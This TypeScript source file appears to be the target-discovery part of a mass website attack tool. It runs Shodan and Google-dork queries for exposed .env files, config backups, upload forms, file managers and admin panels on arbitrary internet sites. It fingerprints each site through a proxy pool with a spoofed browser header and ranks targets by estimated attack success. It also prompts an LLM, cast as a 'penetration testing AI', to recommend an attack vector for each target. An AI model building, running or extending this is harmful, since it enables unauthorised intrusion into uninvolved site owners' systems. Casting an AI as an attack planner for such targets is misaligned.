/**
 * Mass Target Discovery Engine
 * 
 * Auto-discovers vulnerable websites at scale using multiple sources:
 *   1. Shodan API — search for open upload dirs, vulnerable PHP, writable paths
 *   2. SerpAPI Google Dorks — find exposed admin panels, upload forms, misconfigs
 *   3. Vulnerability Scoring — AI-powered scoring based on server fingerprint
 *   4. Target Deduplication & Filtering — remove duplicates, filter by score threshold
 *   5. CMS Detection — identify WordPress, Joomla, Drupal, Laravel, Magento, Custom, Static
 */

import { ENV } from "./_core/env";
import { fetchWithPoolProxy } from "./proxy-pool";
import { invokeLLM } from "./_core/llm";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface DiscoveryQuery {
  source: "shodan" | "serpapi" | "manual";
  query: string;
  category: string; // e.g. "open_upload", "vulnerable_cms", "exposed_config"
}

export interface DiscoveredTarget {
  id: string;
  domain: string;
  ip?: string;
  port?: number;
  url: string;
  source: "shodan" | "serpapi" | "manual";
  sourceQuery: string;
  category: string;

  // Server fingerprint
  serverType?: string;       // Apache, Nginx, IIS, LiteSpeed, etc.
  cms?: string;              // wordpress, joomla, drupal, laravel, magento, custom, static, unknown
  cmsVersion?: string;
  phpVersion?: string;
  os?: string;
  waf?: string;

  // Vulnerability indicators
  hasOpenUpload: boolean;
  hasExposedConfig: boolean;
  hasExposedAdmin: boolean;
  hasWritableDir: boolean;
  hasVulnerableCms: boolean;
  hasWeakAuth: boolean;

  // Scoring
  vulnScore: number;         // 0-100 vulnerability score
  attackDifficulty: "easy" | "medium" | "hard" | "very_hard";
  estimatedSuccessRate: number; // 0-100%
  priorityRank: number;

  // Metadata
  discoveredAt: number;
  lastChecked?: number;
  status: "new" | "scanning" | "scored" | "attacking" | "success" | "failed" | "skipped";
  notes: string[];
}

export interface DiscoveryResult {
  id: string;
  startedAt: number;
  completedAt?: number;
  status: "running" | "completed" | "error";
  
  // Stats
  totalQueriesRun: number;
  totalRawResults: number;
  totalAfterDedup: number;
  totalAfterFilter: number;
  totalScored: number;

  // Results
  targets: DiscoveredTarget[];
  errors: string[];
  
  // Config used
  config: DiscoveryConfig;
}

export interface DiscoveryConfig {
  // Sources
  useShodan: boolean;
  useSerpApi: boolean;
  customQueries?: string[];
  
  // Filters
  minVulnScore: number;        // minimum score to keep (default 30)
  maxTargets: number;          // max targets to return (default 100)
  excludeDomains?: string[];   // domains to skip
  onlyCountries?: string[];    // filter by country code
  
  // CMS filter
  targetCms?: string[];        // only these CMS types
  excludeCms?: string[];       // exclude these CMS types
  
  // Callbacks
  onProgress?: (phase: string, detail: string, progress: number) => void;
}

// ═══════════════════════════════════════════════════════
//  SHODAN QUERIES — Categorized for max coverage
// ═══════════════════════════════════════════════════════

const SHODAN_DISCOVERY_QUERIES: DiscoveryQuery[] = [
  // Open upload directories
  { source: "shodan", query: 'http.title:"Index of /" "upload"', category: "open_upload" },
  { source: "shodan", query: 'port:80 "index of /uploads"', category: "open_upload" },
  { source: "shodan", query: '"upload.php" port:80,443', category: "open_upload" },
  { source: "shodan", query: '"file upload" php', category: "open_upload" },
  { source: "shodan", query: 'http.component:"php" "upload"', category: "open_upload" },
  
  // Vulnerable CMS installations
  { source: "shodan", query: 'http.component:"WordPress" http.status:200', category: "vulnerable_cms" },
  { source: "shodan", query: 'http.component:"Joomla" http.status:200', category: "vulnerable_cms" },
  { source: "shodan", query: 'http.component:"Drupal" http.status:200', category: "vulnerable_cms" },
  { source: "shodan", query: '"wp-login.php" port:80,443', category: "vulnerable_cms" },
  { source: "shodan", query: '"administrator/index.php" "Joomla"', category: "vulnerable_cms" },
  
  // Exposed configurations
  { source: "shodan", query: 'http.title:"phpinfo()" port:80,443', category: "exposed_config" },
  { source: "shodan", query: '"DB_PASSWORD" "DB_HOST" ext:env', category: "exposed_config" },
  { source: "shodan", query: 'http.title:"Index of /" ".env"', category: "exposed_config" },
  { source: "shodan", query: 'http.title:"Index of /" "wp-config.php.bak"', category: "exposed_config" },
  
  // Writable directories
  { source: "shodan", query: 'http.title:"Index of /" "tmp" "upload"', category: "writable_dir" },
  { source: "shodan", query: '"WebDAV" "200 OK" port:80,443', category: "writable_dir" },
  
  // Weak authentication
  { source: "shodan", query: '"cPanel" "login" port:2082,2083', category: "weak_auth" },
  { source: "shodan", query: '"Plesk" "login" port:8443', category: "weak_auth" },
  { source: "shodan", query: 'http.title:"phpMyAdmin" port:80,443', category: "weak_auth" },
  
  // File managers
  { source: "shodan", query: '"elfinder" port:80,443', category: "file_manager" },
  { source: "shodan", query: '"kcfinder" port:80,443', category: "file_manager" },
  { source: "shodan", query: 'http.title:"File Manager" php', category: "file_manager" },
  
  // FTP with anonymous access
  { source: "shodan", query: '"220" "Anonymous" port:21', category: "ftp_anon" },
  
  // Laravel/Magento specific
  { source: "shodan", query: '"Laravel" "debug" port:80,443', category: "framework_vuln" },
  { source: "shodan", query: '"Magento" "admin" port:80,443', category: "framework_vuln" },
  { source: "shodan", query: 'http.component:"Laravel"', category: "framework_vuln" },
];

// ═══════════════════════════════════════════════════════
//  SERPAPI GOOGLE DORK QUERIES
// ═══════════════════════════════════════════════════════

const SERPAPI_DORK_QUERIES: DiscoveryQuery[] = [
  // Upload forms & file managers
  { source: "serpapi", query: 'inurl:"/upload.php" ext:php', category: "open_upload" },
  { source: "serpapi", query: 'inurl:"/kcfinder/browse.php"', category: "file_manager" },
  { source: "serpapi", query: 'inurl:"/elfinder/php/connector"', category: "file_manager" },
  { source: "serpapi", query: 'inurl:"/admin/upload" ext:php', category: "open_upload" },
  { source: "serpapi", query: 'inurl:"/wp-content/uploads/" intitle:"index of"', category: "open_upload" },
  { source: "serpapi", query: 'inurl:"/filemanager/" intitle:"File Manager"', category: "file_manager" },
  
  // Exposed configs
  { source: "serpapi", query: 'intitle:"Index of" ".env" "DB_PASSWORD"', category: "exposed_config" },
  { source: "serpapi", query: 'intitle:"Index of" "wp-config.php.bak"', category: "exposed_config" },
  { source: "serpapi", query: 'inurl:"phpinfo.php" intitle:"phpinfo()"', category: "exposed_config" },
  { source: "serpapi", query: 'intitle:"Index of" "backup.sql"', category: "exposed_config" },
  
  // Vulnerable CMS
  { source: "serpapi", query: 'inurl:"/wp-admin/install.php" "WordPress"', category: "vulnerable_cms" },
  { source: "serpapi", query: 'inurl:"/administrator/" "Joomla" "login"', category: "vulnerable_cms" },
  { source: "serpapi", query: 'inurl:"/user/login" "Drupal"', category: "vulnerable_cms" },
  
  // Laravel debug mode
  { source: "serpapi", query: 'inurl:"_ignition/health-check" "Laravel"', category: "framework_vuln" },
  { source: "serpapi", query: '"Whoops!" "Laravel" "Stack trace"', category: "framework_vuln" },
  
  // Magento
  { source: "serpapi", query: 'inurl:"/downloader/" "Magento"', category: "framework_vuln" },
  { source: "serpapi", query: 'inurl:"/admin" "Magento" "Log in"', category: "framework_vuln" },
  
  // WebDAV
  { source: "serpapi", query: 'intitle:"Index of" "webdav"', category: "writable_dir" },
  
  // Git exposed
  { source: "serpapi", query: 'intitle:"Index of" ".git" "HEAD"', category: "exposed_config" },
  
  // Open directories
  { source: "serpapi", query: 'intitle:"Index of /" "Parent Directory" "upload"', category: "open_upload" },
];

// ═══════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════

function generateDiscoveryId(): string {
  return `disc_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

function generateTargetId(): string {
  return `tgt_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

function extractDomain(urlOrIp: string): string {
  try {
    const url = new URL(urlOrIp.startsWith("http") ? urlOrIp : `http://${urlOrIp}`);
    return url.hostname;
  } catch {
    return urlOrIp.replace(/^https?:\/\//, "").split("/")[0].split(":")[0];
  }
}

function normalizeUrl(urlOrIp: string, port?: number): string {
  if (urlOrIp.startsWith("http")) return urlOrIp.replace(/\/$/, "");
  const proto = port === 443 ? "https" : "http";
  const portSuffix = (port && port !== 80 && port !== 443) ? `:${port}` : "";
  return `${proto}://${urlOrIp}${portSuffix}`;
}

// ═══════════════════════════════════════════════════════
//  1. SHODAN SEARCH
// ═══════════════════════════════════════════════════════

async function searchShodan(
  queries: DiscoveryQuery[],
  onProgress?: (phase: string, detail: string, progress: number) => void,
): Promise<DiscoveredTarget[]> {
  const apiKey = ENV.shodanApiKey;
  if (!apiKey) {
    onProgress?.("shodan", "Shodan API key not configured — skipping", 0);
    return [];
  }

  const targets: DiscoveredTarget[] = [];
  const total = queries.length;

  for (let i = 0; i < total; i++) {
    const q = queries[i];
    const pct = Math.round(((i + 1) / total) * 50); // Shodan = first 50%
    onProgress?.("shodan", `[${i + 1}/${total}] Searching: ${q.query.slice(0, 60)}...`, pct);

    try {
      const url = `https://api.shodan.io/shodan/host/search?key=${apiKey}&query=${encodeURIComponent(q.query)}&minify=true`;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 15000);
      
      const response = await fetch(url, {
        signal: controller.signal,
        headers: { Accept: "application/json" },
      });
      clearTimeout(timeout);

      if (response.ok) {
        const data = await response.json();
        const matches = data.matches || [];
        
        for (const match of matches.slice(0, 15)) {
          const ip = match.ip_str;
          const port = match.port;
          const hostnames = match.hostnames || [];
          const domain = hostnames[0] || ip;
          
          targets.push({
            id: generateTargetId(),
            domain,
            ip,
            port,
            url: normalizeUrl(domain, port),
            source: "shodan",
            sourceQuery: q.query,
            category: q.category,
            serverType: match.product || undefined,
            os: match.os || undefined,
            cms: undefined,
            hasOpenUpload: q.category === "open_upload" || q.category === "file_manager",
            hasExposedConfig: q.category === "exposed_config",
            hasExposedAdmin: q.category === "weak_auth",
            hasWritableDir: q.category === "writable_dir" || q.category === "ftp_anon",
            hasVulnerableCms: q.category === "vulnerable_cms" || q.category === "framework_vuln",
            hasWeakAuth: q.category === "weak_auth" || q.category === "ftp_anon",
            vulnScore: 0,
            attackDifficulty: "medium",
            estimatedSuccessRate: 0,
            priorityRank: 0,
            discoveredAt: Date.now(),
            status: "new",
            notes: [`Found via Shodan: ${q.query}`],
          });
        }
      }
      
      // Rate limit: Shodan free tier = 1 req/sec
      await new Promise(r => setTimeout(r, 1200));
    } catch (e: any) {
      onProgress?.("shodan", `Query failed: ${e.message?.slice(0, 80)}`, pct);
    }
  }

  return targets;
}

// ═══════════════════════════════════════════════════════
//  2. SERPAPI GOOGLE DORK SEARCH
// ═══════════════════════════════════════════════════════

async function searchSerpApi(
  queries: DiscoveryQuery[],
  onProgress?: (phase: string, detail: string, progress: number) => void,
): Promise<DiscoveredTarget[]> {
  const apiKey = ENV.serpApiKeyDev || ENV.serpApiKeyFree;
  if (!apiKey) {
    onProgress?.("serpapi", "SerpAPI key not configured — skipping", 50);
    return [];
  }

  const targets: DiscoveredTarget[] = [];
  const total = queries.length;

  for (let i = 0; i < total; i++) {
    const q = queries[i];
    const pct = 50 + Math.round(((i + 1) / total) * 30); // SerpAPI = 50-80%
    onProgress?.("serpapi", `[${i + 1}/${total}] Dorking: ${q.query.slice(0, 60)}...`, pct);

    try {
      const params = new URLSearchParams({
        api_key: apiKey,
        q: q.query,
        engine: "google",
        num: "20",
      });
      const url = `https://serpapi.com/search.json?${params}`;
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 20000);
      
      const response = await fetch(url, { signal: controller.signal });
      clearTimeout(timeout);

      if (response.ok) {
        const data = await response.json();
        const results = data.organic_results || [];
        
        for (const result of results) {
          const link = result.link || "";
          if (!link) continue;
          
          const domain = extractDomain(link);
          if (!domain || domain.includes("google.") || domain.includes("youtube.")) continue;
          
          targets.push({
            id: generateTargetId(),
            domain,
            url: normalizeUrl(domain),
            source: "serpapi",
            sourceQuery: q.query,
            category: q.category,
            hasOpenUpload: q.category === "open_upload" || q.category === "file_manager",
            hasExposedConfig: q.category === "exposed_config",
            hasExposedAdmin: false,
            hasWritableDir: q.category === "writable_dir",
            hasVulnerableCms: q.category === "vulnerable_cms" || q.category === "framework_vuln",
            hasWeakAuth: false,
            vulnScore: 0,
            attackDifficulty: "medium",
            estimatedSuccessRate: 0,
            priorityRank: 0,
            discoveredAt: Date.now(),
            status: "new",
            notes: [`Found via Google Dork: ${q.query}`, `Original URL: ${link}`],
          });
        }
      }
      
      // SerpAPI rate limit
      await new Promise(r => setTimeout(r, 2000));
    } catch (e: any) {
      onProgress?.("serpapi", `Dork failed: ${e.message?.slice(0, 80)}`, pct);
    }
  }

  return targets;
}

// ═══════════════════════════════════════════════════════
//  3. DEDUPLICATION & FILTERING
// ═══════════════════════════════════════════════════════

function deduplicateTargets(targets: DiscoveredTarget[]): DiscoveredTarget[] {
  const seen = new Map<string, DiscoveredTarget>();
  
  for (const target of targets) {
    const key = target.domain.toLowerCase().replace(/^www\./, "");
    
    if (seen.has(key)) {
      // Merge: keep the one with more indicators
      const existing = seen.get(key)!;
      existing.hasOpenUpload = existing.hasOpenUpload || target.hasOpenUpload;
      existing.hasExposedConfig = existing.hasExposedConfig || target.hasExposedConfig;
      existing.hasExposedAdmin = existing.hasExposedAdmin || target.hasExposedAdmin;
      existing.hasWritableDir = existing.hasWritableDir || target.hasWritableDir;
      existing.hasVulnerableCms = existing.hasVulnerableCms || target.hasVulnerableCms;
      existing.hasWeakAuth = existing.hasWeakAuth || target.hasWeakAuth;
      existing.notes.push(...target.notes);
      if (target.ip && !existing.ip) existing.ip = target.ip;
      if (target.serverType && !existing.serverType) existing.serverType = target.serverType;
      if (target.os && !existing.os) existing.os = target.os;
    } else {
      seen.set(key, { ...target });
    }
  }
  
  return Array.from(seen.values());
}

function filterTargets(
  targets: DiscoveredTarget[],
  config: DiscoveryConfig,
): DiscoveredTarget[] {
  return targets.filter(t => {
    // Exclude specific domains
    if (config.excludeDomains?.some(d => t.domain.toLowerCase().includes(d.toLowerCase()))) return false;
    
    // CMS filter
    if (config.targetCms?.length && t.cms && !config.targetCms.includes(t.cms)) return false;
    if (config.excludeCms?.length && t.cms && config.excludeCms.includes(t.cms)) return false;
    
    // Skip common false positives
    const skipDomains = ["google.", "facebook.", "twitter.", "youtube.", "github.", "stackoverflow.", "wikipedia.", "amazon.", "microsoft.", "apple."];
    if (skipDomains.some(d => t.domain.toLowerCase().includes(d))) return false;
    
    return true;
  });
}

// ═══════════════════════════════════════════════════════
//  4. QUICK FINGERPRINT & CMS DETECTION
// ═══════════════════════════════════════════════════════

async function quickFingerprint(target: DiscoveredTarget): Promise<DiscoveredTarget> {
  const updated = { ...target };
  
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);
    
    const { response } = await fetchWithPoolProxy(updated.url, {
      signal: controller.signal,
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
      },
      redirect: "follow",
    });
    clearTimeout(timeout);

    // Server header
    const server = response.headers.get("server") || "";
    if (server) updated.serverType = server;
    
    // PHP version
    const xPowered = response.headers.get("x-powered-by") || "";
    if (xPowered.includes("PHP")) {
      updated.phpVersion = xPowered.replace("PHP/", "").trim();
    }
    
    // WAF detection
    const cfRay = response.headers.get("cf-ray");
    const sucuri = response.headers.get("x-sucuri-id");
    if (cfRay) updated.waf = "Cloudflare";
    else if (sucuri) updated.waf = "Sucuri";
    
    const body = await response.text().catch(() => "");
    const bodyLower = body.toLowerCase();
    
    // CMS detection from body
    if (bodyLower.includes("wp-content") || bodyLower.includes("wp-includes") || bodyLower.includes("wordpress")) {
      updated.cms = "wordpress";
      const vMatch = body.match(/content="WordPress\s+([\d.]+)"/i);
      if (vMatch) updated.cmsVersion = vMatch[1];
    } else if (bodyLower.includes("/media/jui/") || bodyLower.includes("joomla") || bodyLower.includes("/administrator/")) {
      updated.cms = "joomla";
    } else if (bodyLower.includes("drupal") || bodyLower.includes("/sites/default/")) {
      updated.cms = "drupal";
    } else if (bodyLower.includes("laravel") || bodyLower.includes("csrf-token") || bodyLower.includes("_ignition")) {
      updated.cms = "laravel";
    } else if (bodyLower.includes("magento") || bodyLower.includes("mage-") || bodyLower.includes("/skin/frontend/")) {
      updated.cms = "magento";
    } else if (bodyLower.includes("shopify")) {
      updated.cms = "shopify";
    } else if (bodyLower.includes("<html") && bodyLower.includes("</html>")) {
      updated.cms = body.includes("<?php") || xPowered.includes("PHP") ? "custom" : "static";
    } else {
      updated.cms = "unknown";
    }
    
    updated.lastChecked = Date.now();
  } catch {
    updated.notes.push("Quick fingerprint failed — target may be down");
  }
  
  return updated;
}

// ═══════════════════════════════════════════════════════
//  5. VULNERABILITY SCORING
// ═══════════════════════════════════════════════════════

function calculateVulnScore(target: DiscoveredTarget): DiscoveredTarget {
  let score = 0;
  const reasons: string[] = [];
  
  // Indicator-based scoring
  if (target.hasOpenUpload) { score += 25; reasons.push("+25 open upload"); }
  if (target.hasExposedConfig) { score += 20; reasons.push("+20 exposed config"); }
  if (target.hasExposedAdmin) { score += 15; reasons.push("+15 exposed admin"); }
  if (target.hasWritableDir) { score += 20; reasons.push("+20 writable dir"); }
  if (target.hasVulnerableCms) { score += 15; reasons.push("+15 vulnerable CMS"); }
  if (target.hasWeakAuth) { score += 15; reasons.push("+15 weak auth"); }
  
  // CMS-based scoring
  const cmsScores: Record<string, number> = {
    wordpress: 10,
    joomla: 12,
    drupal: 8,
    laravel: 15,  // debug mode = very vulnerable
    magento: 12,
    custom: 5,
    static: -10,  // static sites are hard to exploit
    shopify: -20, // hosted platform
    unknown: 0,
  };
  const cmsBonus = cmsScores[target.cms || "unknown"] || 0;
  score += cmsBonus;
  if (cmsBonus !== 0) reasons.push(`${cmsBonus > 0 ? "+" : ""}${cmsBonus} CMS: ${target.cms}`);
  
  // WAF penalty
  if (target.waf) {
    score -= 15;
    reasons.push("-15 WAF detected: " + target.waf);
  }
  
  // PHP version bonus (old PHP = more vulnerable)
  if (target.phpVersion) {
    const major = parseInt(target.phpVersion.split(".")[0]);
    if (major <= 5) { score += 15; reasons.push("+15 old PHP " + target.phpVersion); }
    else if (major <= 7) { score += 5; reasons.push("+5 PHP " + target.phpVersion); }
  }
  
  // Multiple sources bonus
  if (target.notes.length > 2) {
    score += 5;
    reasons.push("+5 found by multiple queries");
  }
  
  // Clamp score
  score = Math.max(0, Math.min(100, score));
  
  // Determine difficulty
  let difficulty: DiscoveredTarget["attackDifficulty"];
  if (score >= 70) difficulty = "easy";
  else if (score >= 45) difficulty = "medium";
  else if (score >= 25) difficulty = "hard";
  else difficulty = "very_hard";
  
  // Estimated success rate (correlated with score but not identical)
  const successRate = Math.min(95, Math.max(5, score * 0.85 + (target.waf ? -10 : 5)));
  
  return {
    ...target,
    vulnScore: score,
    attackDifficulty: difficulty,
    estimatedSuccessRate: Math.round(successRate),
    notes: [...target.notes, `Score breakdown: ${reasons.join(", ")}`],
    status: "scored",
  };
}

// ═══════════════════════════════════════════════════════
//  6. AI-ENHANCED SCORING (optional, uses LLM)
// ═══════════════════════════════════════════════════════

async function aiEnhanceScoring(targets: DiscoveredTarget[]): Promise<DiscoveredTarget[]> {
  if (targets.length === 0) return targets;
  
  // Take top 30 targets for AI analysis (to save LLM tokens)
  const topTargets = targets.slice(0, 30);
  const summary = topTargets.map((t, i) => 
    `${i + 1}. ${t.domain} | CMS: ${t.cms || "?"} | Server: ${t.serverType || "?"} | PHP: ${t.phpVersion || "?"} | WAF: ${t.waf || "none"} | Score: ${t.vulnScore} | Indicators: ${[
      t.hasOpenUpload && "open_upload",
      t.hasExposedConfig && "exposed_config",
      t.hasExposedAdmin && "exposed_admin",
      t.hasWritableDir && "writable_dir",
      t.hasVulnerableCms && "vuln_cms",
      t.hasWeakAuth && "weak_auth",
    ].filter(Boolean).join(",") || "none"}`
  ).join("\n");

  try {
    const response = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are a penetration testing AI. Analyze these discovered targets and adjust their vulnerability scores based on your knowledge of common exploits. Return JSON array with format: [{"index": 1, "adjustedScore": 75, "reasoning": "...", "recommendedAttackVector": "..."}]. Only include targets where you'd adjust the score.`,
        },
        {
          role: "user",
          content: `Analyze these ${topTargets.length} targets for file upload vulnerability:\n\n${summary}`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "ai_scoring",
          strict: true,
          schema: {
            type: "object",
            properties: {
              adjustments: {
                type: "array",
                items: {
                  type: "object",
                  properties: {
                    index: { type: "integer" },
                    adjustedScore: { type: "integer" },
                    reasoning: { type: "string" },
                    recommendedAttackVector: { type: "string" },
                  },
                  required: ["index", "adjustedScore", "reasoning", "recommendedAttackVector"],
                  additionalProperties: false,
                },
              },
            },
            required: ["adjustments"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = response.choices?.[0]?.message?.content;
    if (content && typeof content === "string") {
      const parsed = JSON.parse(content);
      for (const adj of parsed.adjustments || []) {
        const idx = adj.index - 1;
        if (idx >= 0 && idx < topTargets.length) {
          topTargets[idx].vulnScore = Math.max(0, Math.min(100, adj.adjustedScore));
          topTargets[idx].notes.push(`AI: ${adj.reasoning} | Attack: ${adj.recommendedAttackVector}`);
        }
      }
    }
  } catch {
    // AI scoring is optional — continue without it
  }

  // Merge AI-adjusted targets back
  const aiMap = new Map(topTargets.map(t => [t.id, t]));
  return targets.map(t => aiMap.get(t.id) || t);
}

// ═══════════════════════════════════════════════════════
//  7. MAIN DISCOVERY FUNCTION
// ═══════════════════════════════════════════════════════

export async function runMassDiscovery(config: DiscoveryConfig): Promise<DiscoveryResult> {
  const result: DiscoveryResult = {
    id: generateDiscoveryId(),
    startedAt: Date.now(),
    status: "running",
    totalQueriesRun: 0,
    totalRawResults: 0,
    totalAfterDedup: 0,
    totalAfterFilter: 0,
    totalScored: 0,
    targets: [],
    errors: [],
    config,
  };

  const onProgress = config.onProgress;

  try {
    // Phase 1: Collect raw targets from all sources
    let allTargets: DiscoveredTarget[] = [];

    // Shodan
    if (config.useShodan) {
      onProgress?.("discovery", "🔍 Phase 1: Shodan search — scanning for vulnerable targets...", 5);
      const shodanTargets = await searchShodan(SHODAN_DISCOVERY_QUERIES, onProgress);
      allTargets.push(...shodanTargets);
      result.totalQueriesRun += SHODAN_DISCOVERY_QUERIES.length;
    }

    // SerpAPI
    if (config.useSerpApi) {
      onProgress?.("discovery", "🔍 Phase 2: Google Dork search — finding exposed sites...", 50);
      const serpTargets = await searchSerpApi(SERPAPI_DORK_QUERIES, onProgress);
      allTargets.push(...serpTargets);
      result.totalQueriesRun += SERPAPI_DORK_QUERIES.length;
    }

    // Custom queries
    if (config.customQueries?.length) {
      onProgress?.("discovery", "🔍 Phase 3: Custom queries...", 80);
      const customShodanQueries: DiscoveryQuery[] = config.customQueries.map(q => ({
        source: "shodan" as const,
        query: q,
        category: "custom",
      }));
      const customTargets = await searchShodan(customShodanQueries, onProgress);
      allTargets.push(...customTargets);
      result.totalQueriesRun += customShodanQueries.length;
    }

    result.totalRawResults = allTargets.length;
    onProgress?.("discovery", `📊 Raw results: ${allTargets.length} targets found`, 82);

    // Phase 2: Deduplicate
    onProgress?.("dedup", "🔄 Deduplicating targets...", 83);
    allTargets = deduplicateTargets(allTargets);
    result.totalAfterDedup = allTargets.length;
    onProgress?.("dedup", `✅ After dedup: ${allTargets.length} unique targets`, 85);

    // Phase 3: Filter
    onProgress?.("filter", "🎯 Filtering targets...", 86);
    allTargets = filterTargets(allTargets, config);
    result.totalAfterFilter = allTargets.length;
    onProgress?.("filter", `✅ After filter: ${allTargets.length} targets`, 87);

    // Phase 4: Quick fingerprint (parallel, max 10 concurrent)
    onProgress?.("fingerprint", `🔬 Fingerprinting ${Math.min(allTargets.length, config.maxTargets)} targets...`, 88);
    const toFingerprint = allTargets.slice(0, config.maxTargets);
    const batchSize = 10;
    const fingerprinted: DiscoveredTarget[] = [];
    
    for (let i = 0; i < toFingerprint.length; i += batchSize) {
      const batch = toFingerprint.slice(i, i + batchSize);
      const results = await Promise.allSettled(batch.map(t => quickFingerprint(t)));
      for (const r of results) {
        if (r.status === "fulfilled") fingerprinted.push(r.value);
      }
      const pct = 88 + Math.round((i / toFingerprint.length) * 8);
      onProgress?.("fingerprint", `🔬 Fingerprinted ${fingerprinted.length}/${toFingerprint.length}...`, pct);
    }

    // Phase 5: Score all targets
    onProgress?.("scoring", "📈 Scoring vulnerability levels...", 96);
    let scored = fingerprinted.map(calculateVulnScore);

    // Phase 6: AI-enhanced scoring
    onProgress?.("ai_scoring", "🤖 AI-enhanced vulnerability analysis...", 97);
    scored = await aiEnhanceScoring(scored);

    // Phase 7: Sort by score and assign priority ranks
    scored.sort((a, b) => b.vulnScore - a.vulnScore);
    scored.forEach((t, i) => { t.priorityRank = i + 1; });

    // Apply minimum score filter
    const filtered = scored.filter(t => t.vulnScore >= config.minVulnScore);
    
    result.totalScored = filtered.length;
    result.targets = filtered.slice(0, config.maxTargets);
    result.status = "completed";
    result.completedAt = Date.now();

    onProgress?.("complete", `✅ Discovery complete: ${result.targets.length} targets scored and ranked`, 100);

  } catch (e: any) {
    result.errors.push(e.message || "Unknown error");
    result.status = "error";
    result.completedAt = Date.now();
  }

  return result;
}

// ═══════════════════════════════════════════════════════
//  EXPORTS
// ═══════════════════════════════════════════════════════

export {
  searchShodan,
  searchSerpApi,
  deduplicateTargets,
  filterTargets,
  quickFingerprint,
  calculateVulnScore,
  aiEnhanceScoring,
  SHODAN_DISCOVERY_QUERIES,
  SERPAPI_DORK_QUERIES,
};
